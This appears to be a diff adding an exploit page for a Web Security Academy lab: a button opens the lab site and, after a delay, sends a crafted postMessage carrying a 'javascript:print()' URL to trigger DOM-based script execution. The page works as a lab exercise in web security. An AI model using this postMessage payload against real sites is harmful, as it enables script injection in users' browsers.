@@ -1,0 +1,14 @@
+<html>
+<body>
+    <input type=button value="Click Me" id="btn">
+</body>
+
+<script>
+document.getElementById('btn').onclick = function(e){
+    var test = window.open('https://0a3e00d903a6161cc6e45a2f00110011.web-security-academy.net/');
+    setTimeout(function(){
+        test.postMessage('javascript:print()//http:','*');
+    }, 2000);
+}
+</script>
+</html>
